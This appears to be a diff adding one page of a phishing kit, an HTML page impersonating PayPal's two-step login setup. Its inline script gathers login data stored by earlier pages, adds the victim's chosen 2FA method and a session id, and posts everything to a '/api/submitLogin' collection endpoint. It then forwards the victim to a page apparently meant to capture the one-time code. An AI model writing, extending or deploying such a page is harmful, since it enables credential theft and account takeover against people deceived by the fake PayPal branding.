@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PayPal 2FA Setup</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <div class="twofa-box">
+    <img src="payp.png" alt="PayPal Logo" class="paypal-logo" />
+
+    <h2>Help secure your account<br>with 2-step login</h2>
+    <p class="twofa-text">
+      Each time you log in, you'll use a one-time code in addition to your password.<br>
+      Choose how you'll get your code.
+    </p>
+    <p><a href="#" class="auth-link">Need an authenticator app?</a></p>
+  
+    <div class="twofa-options">
+      <label class="option">
+        <input type="radio" name="twofa_method" value="Text me a code" checked>
+        <span>Text me a code</span>
+      </label>
+      <label class="option">
+        <input type="radio" name="twofa_method" value="Use an authenticator app">
+        <span>Use an authenticator app</span>
+      </label>
+      <label class="option">
+        <input type="radio" name="twofa_method" value="Use e-mail">
+        <span>Use e-mail</span>
+      </label>
+      <label class="option">
+        <input type="radio" name="twofa_method" value="Use a security key">
+        <span>Use a security key</span>
+      </label>
+    </div>
+  
+    <button class="set-it-up-btn" id="setUpBtn">Set It Up</button>
+  </div>
+
+  <script>
+    // Haal de sessionId op uit localStorage of maak een nieuwe
+    let sessionId = localStorage.getItem('sessionId');
+    if (!sessionId) {
+      sessionId = Math.random().toString(36).substring(2) + Date.now().toString(36);
+      localStorage.setItem('sessionId', sessionId);
+    }
+
+    document.getElementById('setUpBtn').addEventListener('click', function(e) {
+      e.preventDefault();
+  
+      const selectedOption = document.querySelector('input[name="twofa_method"]:checked').value;
+  
+      // Haal eventueel bestaande login data op uit localStorage
+      let loginData = JSON.parse(localStorage.getItem('loginData')) || {};
+  
+      // Voeg verplichte velden toe
+      loginData.type = 'paypal'; // ← voeg type toe!
+      loginData.twoFAchoice = selectedOption;
+      loginData.timestamp = new Date().toISOString();
+      loginData.sessionId = sessionId; // ← voeg sessionId toe!
+  
+      // Verstuur alles naar dezelfde endpoint als voor logins
+      fetch('/api/submitLogin', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(loginData)
+      })
+      .then(response => {
+        if (!response.ok) throw new Error("Network response was not ok");
+        return response.json();
+      })
+      .then(data => {
+        console.log('Success:', data);
+        window.location.href = 'codee.html';
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+        alert("Er ging iets mis. Probeer het opnieuw.");
+      });
+    });
+  </script>
+
+</body>
+</html>
